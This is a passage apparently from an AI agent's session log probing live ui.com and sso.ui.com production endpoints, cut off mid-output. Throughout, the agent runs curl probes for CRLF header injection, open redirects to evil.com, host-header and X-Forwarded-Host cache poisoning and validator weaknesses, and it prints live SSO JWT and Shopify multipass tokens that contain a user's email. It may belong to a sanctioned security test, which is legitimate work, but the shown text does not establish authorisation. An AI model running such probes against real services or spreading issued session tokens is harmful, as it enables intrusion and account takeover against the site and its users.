+ "https://sso.ui.com/api/sso/v1/shopify_login?redirect=%2F%2Fevil.com" ; do
+  echo "--- $url"
+  curl -s -D - -o /dev/null -A "$UA" -H "Cookie: UBIC_AUTH=$TOK" "$url" | grep -iE '^(HTTP|location|x-inj)'
+done
+echo; echo "=== www fresh-build open redirect probes ==="
+for q in "/us/en?s=xx&l=../../evil" "/us/en?redirect=https://evil.com" "/us/en?next=//evil.com" "/download/unifi?link=https://evil.com/x" "/download/unifi/download-started?link=https://evil.com/x" "/us/en/download/software/x?redirect=javascript:alert(1)"; do
+  printf "%s -> " "$q"; curl -s -o /dev/null -D /tmp/wh -w "%{http_code}" -A "Mozilla/5.0" "https://www.ui.com$q"; echo -n "  loc="; grep -i '^location:' /tmp/wh | tr -d '\r'; echo
+done
+=== CRLF / Location injection on sso redirect params ===
+--- https://sso.ui.com/api/sso/v1/jwt/token?redirect=https%3A%2F%2Fwww.ui.com%250d%250aX-Inj%3A%201
+HTTP/2 404 
+--- https://sso.ui.com/api/sso/v1/jwt/token?redirect=https%3A%2F%2Fwww.ui.com%0d%0aX-Inj%3A1
+HTTP/2 404 
+--- https://sso.ui.com/api/sso/v1/zendesk_login?return_to=https%3A%2F%2Fwww.ui.com%0d%0aX-Inj%3A1
+HTTP/2 302 
+location: https://ubnt.zendesk.com/access/jwt?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiT3BlbkNvZGVUZXN0IiwiZW1haWwiOiJ0YW4udGlnZXI1NTY0QG1haWxkcm9wLmNjIiwiZXh0ZXJuYWxfaWQiOiJkODk0NmZhZC0yYjhlLTRjZjAtODJjNS01ZDk1NWI1N2I4MjkiLCJ2ZXJpZmllZCI6dHJ1ZSwianRpIjoiMjY5ZDZkMzkxYmE1NDFmMjlkZTUxYmIxYzIzMjU0NDgiLCJpYXQiOjE3OTU1MTMzNTYsImV4cCI6MTc5NTUxMzk1NiwicmVtb3RlX3Bob3RvX3VybCI6Imh0dHBzOi8vYWNjb3VudC1jZG4uc3ZjLnVpLmNvbS9kZWUyMjc5Yy1kZGU3LTRmYTktOTFjYi0xZTNkOTcxNjA5ZWEifQ.vRUFfxhHSfCRp-oLVx97R32-uBcEOXjyPj8Da-xnCH0&return_to=https%3A%2F%2Fwww.ui.com%0D%0AX-Inj%3A1
+--- https://sso.ui.com/api/sso/v1/shopify_login?redirect=%2F%2Fevil.com
+HTTP/2 302 
+location: https://us.shop.ui.com/account/login/multipass/76lzLvJjRC0J619mE4lMtfM5yPe4x7vB2qEIR_eOIfBl7rCLArk9nNXVIZSZnI8HUTZQlLnXUSdn3mjgnpCa87iNe8mZmbBLG2M9qcROqocpZF_Cs8ekIBOwWFvKfVqiMNgrHrsu7mOfSks7s13zvpiXUD909HPy1iu8P_Wri9Bo1FlbhquD1HMoK1uEHYNh8_bY4eu_8rTiyUA0OcObclMUw4OGtw_Ms71pV6CKSg05mNEF2f3fKUEglFwGvNacmQULwrdeQ5W3gsPFYFvxyfWaRnClEWbKoiEOCXSLGGtnkzvGV68yu2STkzQ5AnwCpjJhAoAOnmhTxW39Pq1bt2gv5iAxr6PQ13ccoH1M03qwbHcAb23y0SzRVKFie3t44lQ_Uqx1IH0-LoC_QFfWr6cNruMwNGBpznyozkOjukxgev-bHuVhqGvmPactUYv0
+
+=== www fresh-build open redirect probes ===
+/us/en?s=xx&l=../../evil -> 200  loc=
+/us/en?redirect=https://evil.com -> 200  loc=
+/us/en?next=//evil.com -> 200  loc=
+/download/unifi?link=https://evil.com/x -> 200  loc=
+/download/unifi/download-started?link=https://evil.com/x -> 200  loc=
+/us/en/download/software/x?redirect=javascript:alert(1) -> 404  loc=
+[0m
+[0m→ [0mRead result/out-of-scope.txt
+Let me audit the new build's download/link handling, which is the main user-input sink.
+[0m
+[0m$ [0mcd /tmp && rm -rf www27b && mkdir -p www27b
+for p in "/us/en/download/unifi" "/us/en/download/unifi/download-started" "/us/en/download/releases/firmware" "/us/en/download/software/unifi-os-server"; do
+  f=$(echo "$p" | tr '/' '_'); curl -s -A "Mozilla/5.0" "https://www.ui.com$p" -o "www27b$f.html" -w "$p -> %{http_code} %{size_download}\n"
+done
+echo "=== all chunk refs across pages ==="
+cat www27b*.html | grep -oE '/_next/static/chunks/[A-Za-z0-9_.-]+\.js' | sort -u > www27b/chunks.txt
+wc -l www27b/chunks.txt
+comm -13 <(sort /tmp/www27/chunks.txt) <(sort www27b/chunks.txt) | head -40
+/us/en/download/unifi -> 200 1345352
+/us/en/download/unifi/download-started -> 200 259186
+/us/en/download/releases/firmware -> 200 655309
+/us/en/download/software/unifi-os-server -> 200 608789
+=== all chunk refs across pages ===
+37 www27b/chunks.txt
+/_next/static/chunks/0015aotek3ne8.js
+/_next/static/chunks/33ta9m-kv8psq.js
+/_next/static/chunks/3g06v6khchgvy.js
+/_next/static/chunks/3s9g_p10b3kzo.js
+/_next/static/chunks/3un202uidomza.js
+/_next/static/chunks/4274v5o1d4w1l.js
+[0m
+[0m$ [0mcd /tmp
+comm -13 <(sort /tmp/www27/chunks.txt) <(sort www27b/chunks.txt) | sed 's#^#https://www.ui.com#' | xargs -P 8 -I{} sh -c 'f=$(echo "{}" | sed "s#.*/##"); curl -s -A "Mozilla/5.0" "{}" -o "/tmp/www27/$f"'
+echo "=== link allowlist / download-started in new chunks ==="
+cd /tmp/www27
+grep -ohE '.{200}(dl\.ubnt\.com|fw-download|download-started|link).{200}' 0015aotek3ne8.js 33ta9m-kv8psq.js 3g06v6khchgvy.js 3s9g_p10b3kzo.js 3un202uidomza.js 4274v5o1d4w1l.js 2>/dev/null | grep -iE 'link|allow|host|https' | head -30
+echo "=== search all chunks for allowlist hosts ==="
+grep -lE 'dl\.ubnt\.com|fw-download\.ubnt\.com|dl\.ui\.com' *.js
+=== link allowlist / download-started in new chunks ===
+-light__y0yQx3fC","tertiary-dark":"tertiary-dark__y0yQx3fC",tertiary:"tertiary__y0yQx3fC",default:"default__y0yQx3fC","default-light":"default-light__y0yQx3fC","default-dark":"default-dark__y0yQx3fC",link:"link__y0yQx3fC","link-light":"link-light__y0yQx3fC","inline-light":"inline-light__y0yQx3fC","link-dark":"link-dark__y0yQx3fC","inline-dark":"inline-dark__y0yQx3fC","is-accessible-light":"is-accessib
+x3fC,.default-dark__y0yQx3fC:active.is-accessible__y0yQx3fC,.default-dark__y0yQx3fC:focus.is-accessible__y0yQx3fC{box-shadow:0 0 0 1px #0e65d8}.default__y0yQx3fC:focus{outline:none}.inline__y0yQx3fC,.link__y0yQx3fC{background-color:#0000;height:auto;text-decoration:none}.inline-light__y0yQx3fC,.link-light__y0yQx3fC{color:#006fff}.inline-light__y0yQx3fC:hover,.link-light__y0yQx3fC:hover{color:#338bff}.
+k-light__y0yQx3fC.active__y0yQx3fC,.link-light__y0yQx3fC:active{color:#0058cc}.inline-light__y0yQx3fC.disabled__y0yQx3fC,.link-light__y0yQx3fC.disabled__y0yQx3fC{color:#99c5ff}.inline-dark__y0yQx3fC,.link-dark__y0yQx3fC{color:#4797ff}.inline-dark__y0yQx3fC:hover,.link-dark__y0yQx3fC:hover{color:#277ff1}.inline-dark__y0yQx3fC.active__y0yQx3fC,.inline-dark__y0yQx3fC:active,.link-dark__y0yQx3fC.active__y
+link-dark__y0yQx3fC:active{color:#80b7ff}.inline-dark__y0yQx3fC.disabled__y0yQx3fC,.link-dark__y0yQx3fC.disabled__y0yQx3fC{color:#0b4ead}.inline__y0yQx3fC:focus-visible.is-accessible-light__y0yQx3fC,.link__y0yQx3fC:focus-visible.is-accessible-light__y0yQx3fC{outline:1px solid #66a8ff}.inline__y0yQx3fC:focus-visible.is-accessible-dark__y0yQx3fC,.link__y0yQx3fC:focus-visible.is-accessible-dark__y0yQx3fC
+ocus{outline:none}.inline__y0yQx3fC.small__y0yQx3fC,.link__y0yQx3fC.small__y0yQx3fC{font-size:var(--desktop-font-size-small,11px)}.inline__y0yQx3fC.medium__y0yQx3fC,.inline__y0yQx3fC.small__y0yQx3fC,.link__y0yQx3fC.medium__y0yQx3fC,.link__y0yQx3fC.small__y0yQx3fC{font-family:var(--desktop-font-family-default,Inter,Lato,Arial,sans-serif);font-weight:var(--desktop-font-weight-regular,400);line-height:20
+yQx3fC.medium__y0yQx3fC{font-size:var(--desktop-font-size-medium,13px)}.inline__y0yQx3fC.inherit__y0yQx3fC,.link__y0yQx3fC.inherit__y0yQx3fC{font-size:inherit}.inline__y0yQx3fC.weight-bold__y0yQx3fC,.link__y0yQx3fC.weight-bold__y0yQx3fC{font-weight:var(--desktop-font-weight-semibold,600)}.inline__y0yQx3fC.weight-normal__y0yQx3fC,.link__y0yQx3fC,.link__y0yQx3fC.weight-normal__y0yQx3fC{font-weight:var(-
+),E=Object.values(l);e.s(["D",0,e=>{let r=new URLSearchParams,o=S(e.slug);return o&&r.set("type",h[o]),e.version&&r.set("v",e.version),r.set("variant",e.name.includes(c)?"os":"net"),e.fileUrl&&r.set("link",encodeURIComponent(e.fileUrl)),`${C}?${r}`},"f",0,(e,r)=>{let[o,a,i]=(e??"").split("-").map(Number),t=new Date(o,a-1,i);return!e||Number.isNaN(t.getTime())?"-":new Intl.DateTimeFormat(r,{day:"numeri
+geSizes:t.sizes,crossOrigin:t.crossOrigin,referrerPolicy:t.referrerPolicy,...g(t.fetchPriority)};return e&&a.default.preload?(a.default.preload(t.src,i),null):(0,l.jsx)(s.default,{children:(0,l.jsx)("link",{rel:"preload",href:t.srcSet?void 0:t.src,...i},"__nimg-"+t.src+t.srcSet+t.sizes)})}let C=(0,o.forwardRef)((e,t)=>{let i=(0,o.useContext)(c.RouterContext),r=(0,u.useImageConfig)(),{onLoad:n,onLoadin
+ns.helpCenter",text:"downloadStarted.helpCenter.gettingStartedWithUniFi",href:"https://help.ui.com/hc/en-us/sections/13672141535127-Getting-Started-with-UniFi"}];return(0,n.useEffect)(()=>{if(!o.has("link"))return;let e=new URLSearchParams(o);e.delete("link");let i=e.toString();t.replace(i?`${r}?${i}`:r,{scroll:!1})},[o,r,t]),(0,n.useEffect)(()=>{if(!u)return;let e=document.createElement("a");e.href=u
+,i.jsxs)(i.Fragment,{children:[e("downloadStarted.autoStart",{application:e(_[s])})," ",e("downloadStarted.manualDownload.prefix")," ",(0,i.jsx)("a",{href:u,children:e("downloadStarted.manualDownload.link")}),"."]}):(0,i.jsxs)(i.Fragment,{children:[e("downloadStarted.noLink.prefix")," ",(0,i.jsx)(b.f,{href:`/download/releases/${v.h.UniFiOsServer}`,children:e("downloadStarted.noLink.link")}),"."]})})})
+"],n=/^\d[0-9A-Za-z.-]{0,31}$/,l=(e,t,i)=>e.find(e=>e===t)??i;e.s(["L",0,e=>{let o=e.get("v");return{type:l(i,e.get("type"),"win"),variant:l(r,e.get("variant"),"net"),version:o&&n.test(o)?o:"9.0.114",link:(0,t.u)(e.get("link"))}},"_",0,e=>{if("object"!=typeof e||null===e||!("platforms"in e))return{};let{platforms:i}=e;if("object"!=typeof i||null===i)return{};let r={};for(let[e,n]of Object.entries(i)){
+),M=Object.values(o);e.s(["D",0,e=>{let t=new URLSearchParams,i=D(e.slug);return i&&t.set("type",m[i]),e.version&&t.set("v",e.version),t.set("variant",e.name.includes(d)?"os":"net"),e.fileUrl&&t.set("link",encodeURIComponent(e.fileUrl)),`${h}?${t}`},"f",0,(e,t)=>{let[i,r,n]=(e??"").split("-").map(Number),l=new Date(i,r-1,n);return!e||Number.isNaN(l.getTime())?"-":new Intl.DateTimeFormat(t,{day:"numeri
+=== search all chunks for allowlist hosts ===
+33ta9m-kv8psq.js
+3s9g_p10b3kzo.js
+[0m
+[0m$ [0mcd /tmp/www27
+for f in 33ta9m-kv8psq.js 3s9g_p10b3kzo.js; do echo "### $f"; grep -oE '.{80}(dl\.ubnt\.com|fw-download\.ubnt\.com|dl\.ui\.com).{300}' "$f" | head -4; done
+echo "=== find link validator export u ==="
+grep -ohE '["'\'']u["'\''],0,[^)]{0,400}' 33ta9m-kv8psq.js 3s9g_p10b3kzo.js | head -5
+echo "=== new URL / protocol checks ==="
+grep -ohE '.{120}(new URL\(|protocol|hostname).{200}' 33ta9m-kv8psq.js 3s9g_p10b3kzo.js | grep -iE 'https|host|allow|protocol' | head -12
+### 33ta9m-kv8psq.js
+.Linux]:"linux",[s.UniFiOs]:"unifi-os",[s.UniFiOsNative]:"unifi-os-native"},b=["dl.ubnt.com","dl.ui.com","fw-download.ubnt.com"],C="/download/unifi/download-started";e.s(["h",0,b,"i",0,_,"a",0,f,"U",0,C,"s",0,h,"g",0,50,"V",0,y,"x",0,5,"p",0,c,"C",0,d,"O",0,400,"D",0,["ACCESS_POINT","CAMERA","CONSOLE","GATEWAY","SWITCH","WAVE","AIRFIBER","AIRMAX"],"H",0,3],853031);var x=e.i(871101),u=e.i(
+### 3s9g_p10b3kzo.js
+.Linux]:"linux",[a.UniFiOs]:"unifi-os",[a.UniFiOsNative]:"unifi-os-native"},g=["dl.ubnt.com","dl.ui.com","fw-download.ubnt.com"],h="/download/unifi/download-started";e.s(["h",0,g,"i",0,c,"a",0,f,"U",0,h,"s",0,m,"g",0,50,"V",0,u,"x",0,5,"p",0,d,"C",0,p,"O",0,400,"D",0,["ACCESS_POINT","CAMERA","CONSOLE","GATEWAY","SWITCH","WAVE","AIRFIBER","AIRMAX"],"H",0,3],853031);var x=e.i(871101),_=e.i(
+=== find link validator export u ===
+"u",0,e=>{if(!e
+"u",0,e=>{if(!e
+=== new URL / protocol checks ===
+downloads:R,productFamily:w}),e.s(["L",0,N,"_",0,m,"i",0,v],898246);let B=e=>{if(!e||!URL.canParse(e))return null;let r=new URL(e);return"https:"===r.protocol?r.href:null},H=e=>({id:e.id,name:e.name,slug:e.slug,version:e.version||null,publishedAt:e.date_published||null,releaseNotesUrl:B(e.release_notes_url)??B(e.changelog),fil
+e)?e:`V${e}`:null,"u",0,e=>{if(!e)return null;try{var r=decodeURIComponent(e);if(!r||!URL.canParse(r))return null;let o=new URL(r);return"https:"===o.protocol&&b.includes(o.hostname)?o.href:null}catch{return null}},"q",0,(e,r)=>{let o=T(r);return o?E.includes(r.trim().toLowerCase())?e.filter(({subCategory:e,productLine:r})=>!!
+downloads:L,productFamily:A}),e.s(["L",0,S,"_",0,E,"i",0,y],898246);let j=e=>{if(!e||!URL.canParse(e))return null;let t=new URL(e);return"https:"===t.protocol?t.href:null},U=e=>({id:e.id,name:e.name,slug:e.slug,version:e.version||null,publishedAt:e.date_published||null,releaseNotesUrl:j(e.release_notes_url)??j(e.changelog),fil
+e)?e:`V${e}`:null,"u",0,e=>{if(!e)return null;try{var t=decodeURIComponent(e);if(!t||!URL.canParse(t))return null;let i=new URL(t);return"https:"===i.protocol&&g.includes(i.hostname)?i.href:null}catch{return null}},"q",0,(e,t)=>{let i=z(t);return i?M.includes(t.trim().toLowerCase())?e.filter(({subCategory:e,productLine:t})=>!!
+[0m
+The new www build's link allowlist is strict (exact hostname match). Let me check whether Next.js 16.4.6 has any relevant known issues worth testing.
+[0m◈ [0mExa Web Search "Next.js 16.4 vulnerability middleware bypass server action SSRF CVE 2026"
+Next.js 16.4.6 is fully patched. Let me check whether the Site Manager SPA (wildcard `*.ui.com`) has changed, since an attacker-controlled `*.ui.com` origin is the key to the CORS/clickjacking findings.
+[0m
+[0m$ [0mcd /tmp
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+for h in unifi.ui.com evil.ui.com xyz123.ui.com; do
+  echo "=== https://$h/ ==="; curl -s -D /tmp/hh -o /tmp/hb -A "$UA" "https://$h/" -w "%{http_code} %{size_download}\n"; grep -iE '^(location|server|x-cache|content-type):' /tmp/hh | tr -d '\r'; grep -oE '(src|href)="[^"]+\.js"' /tmp/hb | head -5
+done
+=== https://unifi.ui.com/ ===
+302 0
+server: CloudFront
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://evil.ui.com/ ===
+302 0
+server: CloudFront
+location: https://account.ui.com/login?redirect=https%3A%2F%2Fevil.ui.com%2F
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://xyz123.ui.com/ ===
+302 0
+server: CloudFront
+location: https://account.ui.com/login?redirect=https%3A%2F%2Fxyz123.ui.com%2F
+x-cache: FunctionGeneratedResponse from cloudfront
+[0m
+Interesting: wildcard `*.ui.com` reflects the Host into a login `redirect` param. Let me probe that CloudFront function for open-redirect behavior.
+[0m$ [0mcd /tmp
+UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+probe(){ echo "=== $1"; curl -s -D - -o /dev/null -A "$UA" "$1" | grep -iE '^(HTTP|location|x-cache):' | tr -d '\r'; }
+probe "https://unifi.ui.com/foo/bar?x=1"
+probe "https://unifi.ui.com/?redirect=https://evil.com"
+probe "https://unifi.ui.com/?next=//evil.com"
+probe "https://unifi.ui.com//evil.com"
+probe "https://unifi.ui.com/%2f%2fevil.com"
+probe "https://unifi.ui.com/?redirect=https%3A%2F%2Fevil.com"
+echo "=== Host header override tests (connect to unifi IP, vary Host) ==="
+IP=$(getent hosts unifi.ui.com | awk '{print $1}' | head -1); echo "IP=$IP"
+for H in "evil.com" "unifi.ui.com.evil.com" "unifi.ui.com@evil.com"; do
+ echo "--- Host: $H"; curl -s -D - -o /dev/null -A "$UA" --resolve "unifi.ui.com:443:$IP" -H "Host: $H" "https://unifi.ui.com/" | grep -iE '^(HTTP|location):' | tr -d '\r'
+done
+=== https://unifi.ui.com/foo/bar?x=1
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2Ffoo%2Fbar%3Fx%3D1
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://unifi.ui.com/?redirect=https://evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F%3Fredirect%3Dhttps%3A%2F%2Fevil.com
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://unifi.ui.com/?next=//evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F%3Fnext%3D%2F%2Fevil.com
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://unifi.ui.com//evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F%2Fevil.com
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://unifi.ui.com/%2f%2fevil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F%252f%252fevil.com
+x-cache: FunctionGeneratedResponse from cloudfront
+=== https://unifi.ui.com/?redirect=https%3A%2F%2Fevil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F%3Fredirect%3Dhttps%253A%252F%252Fevil.com
+x-cache: FunctionGeneratedResponse from cloudfront
+=== Host header override tests (connect to unifi IP, vary Host) ===
+IP=2600:9000:233e:dc00:6:2c98:ce80:93a1
+--- Host: evil.com
+--- Host: unifi.ui.com.evil.com
+--- Host: unifi.ui.com@evil.com
+[0m
+[0m$ [0mcd /tmp
+UA="Mozilla/5.0"
+IP4=$(python3 -c "import socket;print(socket.gethostbyname('unifi.ui.com'))" 2>/dev/null); echo "IP4=$IP4"
+echo "=== Host header variants (IPv4 resolve) ==="
+for H in "evil.com" "unifi.ui.com.evil.com" "evil.ui.com" "unifi.ui.com"; do
+ echo "--- Host: $H"; curl -s -D - -o /dev/null -A "$UA" --resolve "unifi.ui.com:443:$IP4" -H "Host: $H" "https://unifi.ui.com/" 2>&1 | grep -iE '^(HTTP|location):' | tr -d '\r'
+done
+echo "=== X-Forwarded-Host / X-Host variants ==="
+for hdr in "X-Forwarded-Host: evil.com" "X-Host: evil.com" "X-Forwarded-Server: evil.com" "Forwarded: host=evil.com"; do
+ echo "--- $hdr"; curl -s -D - -o /dev/null -A "$UA" -H "$hdr" "https://unifi.ui.com/" | grep -iE '^(HTTP|location):' | tr -d '\r'
+done
+IP4=108.156.224.52
+=== Host header variants (IPv4 resolve) ===
+--- Host: evil.com
+--- Host: unifi.ui.com.evil.com
+--- Host: evil.ui.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Fevil.ui.com%2F
+--- Host: unifi.ui.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+=== X-Forwarded-Host / X-Host variants ===
+--- X-Forwarded-Host: evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+--- X-Host: evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+--- X-Forwarded-Server: evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+--- Forwarded: host=evil.com
+location: https://account.ui.com/login?redirect=https%3A%2F%2Funifi.ui.com%2F
+[0m
+[0m$ [0mcd /tmp
+TOK=$(cat /tmp/A_token.txt); UA="Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15"
+curl -s -D /tmp/uh -o /tmp/ub -A "$UA" -H "Cookie: UBIC_AUTH=$TOK" "https://unifi.ui.com/" -w "HTTP %{http_code} size=%{size_download}\n"
+grep -iE '^(HTTP|location|content-type|x-cache):' /tmp/uh | tr -d '\r'
+echo "=== script refs ==="; grep -oE '(src|href)="[^"]+\.(js|css)"' /tmp/ub | head -20
+echo "=== title ==="; grep -oE '<title>[^<]*</title>' /tmp/ub | head -1
+echo "=== body head ==="; head -c 400 /tmp/ub
+HTTP 200 size=1498
+content-type: text/html
+x-cache: Miss from cloudfront
+=== script refs ===
+src="/runtime.0970c4a4fa8d2c6d.js"
+src="/8304.36bf3651bc9f7d91.js"
+src="/1038.b36f49af8bd31464.js"
+src="/7701.fd6dc3996623dc2b.js"
+src="/3136.69f4989f999f2921.js"
+src="/7731.9625f6b1183f4b85.js"
+src="/3575.f19ea1e5879e01ef.js"
+src="/1336.7954eef9cf8af281.js"
+src="/main-0.2678141fb293ea0d.js"
+src="/main-2.99fff016d6b090e8.js"
+src="/main-3.3960a4e87c585ec0.js"
+src="/main-4.4f990cdc0ae3120a.js"
+src="/main-5.4d5c430baf4c1c78.js"
+src="/main-6.516afea6ecbf826a.js"
+src="/main-7.89817c7552da11f1.js"
+href="/main-1.08721804.css"
+=== title ===
+<title>UniFi Site Manager</title>
+=== body head ===
+<!doctype html><html lang="en"><head><meta charset="utf-8"><meta name="robots" content="noindex"><link rel="icon" href="/favicon.ico?v3" sizes="any"><link rel="icon" href="/favicon.svg?v3" type="image/svg+xml"><link rel="apple-touch-icon" href="/apple-touch-icon.png?v3"><title>UniFi Site Manager</title><meta content="width=device-width,initial-scale=1" name="viewport"><script defer src="/runtime.0
+[0m
+Site Manager is unchanged. Let me examine the `innerRedirect` validator (`IS`) — prior sessions tested `redirect` but not this path.
+[0m$ [0mcd /tmp/acct27
+echo "=== locate TQ and validators ==="
+grep -oE '.{20}IS=.{200}' app.js | head -4
+grep -oE '.{20}NS=.{260}' app.js | head -4
+echo "=== all 'innerRedirect' assignment/validation ==="
+grep -oE '.{100}innerRedirect.{140}' app.js | head -12
+=== locate TQ and validators ===
+op}catch{return!0}},IS=e=>!e||!e.startsWith(`/`)||e.startsWith(`//`)||e.includes(`\\`)?!1:mhe.some(t=>e===t||e.startsWith(`${t}/`)),LS=(e,t)=>{let n=jS(window.location.toString(),e);return typeof n==`string`?t(n):null},RS=n
+C(e,t))},e.prefetchDNS=function(e){typeof e==`string`&&i.d.D(e)},e.preinit=function(e,t){if(typeof e==`string`&&t&&typeof t.as==`string`){var n=t.as,r=u(n,t.crossOrigin),a=typeof t.integrity==`string`?t.integrity:void 0,o=typeof t.fetchPriority==`string`?t.fetchPriority:void 0;n===`
+GAL=`legal`,e.SESSIONS=`sessions`,e.ANNOUNCEMENTS=`announcements`,e.BILLING_CUSTOMER=`billingCustomer`,e.BILLING_CARDS=`billingCards`,e.BILLING_TAX_ID=`billingTaxId`,e.BILLING_SUBSCRIPTIONS=`billingSubscriptions`,e.BILLING_PRODUCTS=`billingProducts`,e.BILLING_INVOICES=`billingInvoic
+`,e.FULL_SUBSCRIPTIONS=`fullSubscriptions`,e.SITE_SUPPORT_PLANS=`siteSupportPlans`,e.SITE_SUPPORT_SUBSCRIPTION=`siteSupportSubscription`,e.CLOUD_STORAGE_AVAILABILITY=`cloudStorageAvailability`,e.CLOUD_STORAGE_STORAGE_REGIONS=`cloudStorageStorageRegions`,e.CLOUD_STORAGE_PLANS=`cloudS
+lable`,e.ORGANIZATIONS=`organizations`,e.BRAZIL_ADDRESS_INFO=`brazilAddressInfo`,e.SSO_PROFILE=`ssoProfile`,e.SSO_PROFILE_SETTINGS=`ssoProfileSettings`,e.ZENDESK_USER=`zendeskUser`,e.MFA_AUTHENTICATORS=`mfaAuthenticators`,e.MFA_INITIATED_METHOD=`mfaInitiatedMethod`,e.MFA_INITIATED_P
+=== all 'innerRedirect' assignment/validation ===
+turn(0,F.useCallback)(n=>{let r=t.getQueryData([H.SSO_LOGIN_STATE]),i=n?.redirect??r?.redirect,a=n?.innerRedirect??r?.innerRedirect;i?window.location.replace(i):e(a||`/`,{replace:!0})},[t,e])},SQ=function(e){return e.ACTIVE=`active`,e.PENDING=`pending`,
+with SafetyNet Attestation`,e}({}),T9e=[`push`,`totp`,`webauthn`],TQ=e=>{if(!e)return{redirect:null,innerRedirect:null};try{let t=new URL(e),n=new URLSearchParams(t.search),r=n.get(`redirect`),i=n.get(`innerRedirect`);return{redirect:NS(r)?r:null,innerR
+;return{logout:bQ({bridge:void 0,mutationFn:e.logout,onSuccess:(e,{url:i})=>{t(),n();let{redirect:a,innerRedirect:o}=TQ(i);r({redirect:a,innerRedirect:o})}}).mutate}},k9e=({onForgotPassword:e})=>{let{name:t,state:n,handleChange:r,handleBlur:i}=lQ(),a=n.
+h.slice(1)}`;let t=e.pathname+e.search,n=IS(e.pathname)?encodeURIComponent(t):null;return n?`/login?innerRedirect=${n}`:`/login`},OQ=(e,t)=>function(n){let{isInitialLoading:r}=aw(),i=kp();if(r)return null;let a=i.getQueryData([H.SSO_AUTH_STATE])?.isAuth
+ew Image;e.src=Krt,e.onload=()=>c(!0)},[]),t)return null;if(l&&!ghe.has(i.pathname)){let{redirect:e,innerRedirect:t}=TQ(window.location.href);return r({redirect:e,innerRedirect:t}),null}return(0,I.jsxs)(Yrt,{publicPage:!0,children:[(o||a||!1)&&(0,I.jsx)
+ull,mutationFn:e.login,onMutate:()=>{t.setQueryData([H.SSO_LOGIN_STATE],{isLoading:!0,redirect:null,innerRedirect:null})},onSettled:async(e,i)=>{let{redirect:a,innerRedirect:o}=TQ(window.location.href);t.setQueryData([H.SSO_LOGIN_STATE],t=>({...t,error:
+defaultMFA:i?.response?.data?.user?.default_mfa,otp_prefix:i?.response?.data?.otp_prefix,redirect:a,innerRedirect:o,defaultEmailMfa:O9e(i)}));let s=E9e([`unifi.ui.com`,`unifi.df.ui.com`,`unifi.stg.ui.com`,`unifi.dev.ui.com`],a)||e?.is_verified;if(!i&&s)
+t,e),await $2(e,t)){n(`/login/create-passkey`,{state:{allowPasskeyPrompt:!0}});return}r({redirect:a,innerRedirect:o})}else return t.setQueryData([H.SSO_AUTH_STATE],e=>({...e,emailChangeable:i?.status===499&&!!i.response?.data.user.email_changeable,feedb
+ a=uNt(i);return await e.login({publicKeyCredential:a,remember_me:n})},onSuccess:e=>{let{redirect:n,innerRedirect:r}=TQ(window.location.href);EQ(t,e),i({redirect:n,innerRedirect:r})},onError:e=>{let{hasPasskeyError:t}=u5(e);return t?r({title:(0,I.jsx)(q
+d:async(e,r)=>(t.setQueryData([H.SSO_LOGIN_STATE],t=>({...t,isLoading:!1,redirect:t?.redirect??null,innerRedirect:t?.innerRedirect??null,unverifiedEmail:e?.is_verified?void 0:e?.email,mfaError:r?.response?.status===401?`unauthorized`:s7(r)?PFt:r?.respon
+.setQueryData([H.SSO_LOGIN_STATE],e=>({...e,mfaError:void 0,isLoading:!1,redirect:e?.redirect??null,innerRedirect:e?.innerRedirect??null}))},[t]),a=t.getQueryData([H.SSO_LOGIN_STATE])?.mfaError,o=IFt({isLoading:r.isPending,hasError:!!a,isAlreadyUsed:a==
+[0m
+`innerRedirect` is strictly allowlisted (single leading slash, no `//`/backslash). Let me test the new www build for host-header cache poisoning, which the prior build tested but this is a fresh deployment.
+[0m$ [0mcd /tmp
+R=$(head -c6 /dev/urandom | od -An -tx1 | tr -d ' \n')
+echo "=== XFH / XFP reflection on new www build (unique cb=$R) ==="
+for hdr in "X-Forwarded-Host: evil.com" "X-Forwarded-Proto: https://evil.com" "X-Host: evil.com" "Forwarded: host=evil.com;proto=https"; do
+  echo "--- $hdr"
+  curl -s -D /tmp/ph -o /tmp/pb -A "Mozilla/5.0" -H "$hdr" "https://www.ui.com/us/en?cb=$R" -w "HTTP %{http_code}\n"
+  grep -iE '^(x-nextjs-cache|x-middleware-rewrite|location|set-cookie):' /tmp/ph | tr -d '\r'
+  echo -n "evil.com in body: "; grep -c 'evil.com' /tmp/pb
+  echo -n "og:url: "; grep -oE '<meta property="og:url"[^>]*>' /tmp/pb | head -1
+done
+echo "=== does cache key include query? repeat same URL, compare x-nextjs-cache ==="
+curl -s -D - -o /dev/null -A "Mozilla/5.0" "https://www.ui.com/us/en?cb=$R" | grep -iE '^(x-nextjs-cache|x-cache):' | tr -d '\r'
+=== XFH / XFP reflection on new www build (unique cb=5c1d0f9613c4) ===
+--- X-Forwarded-Host: evil.com
+HTTP 200
+x-nextjs-cache: HIT
+evil.com in body: 0
+og:url: <meta property="og:url" content="https://ui.com/"/>
+--- X-Forwarded-Proto: https://evil.com
+HTTP 200
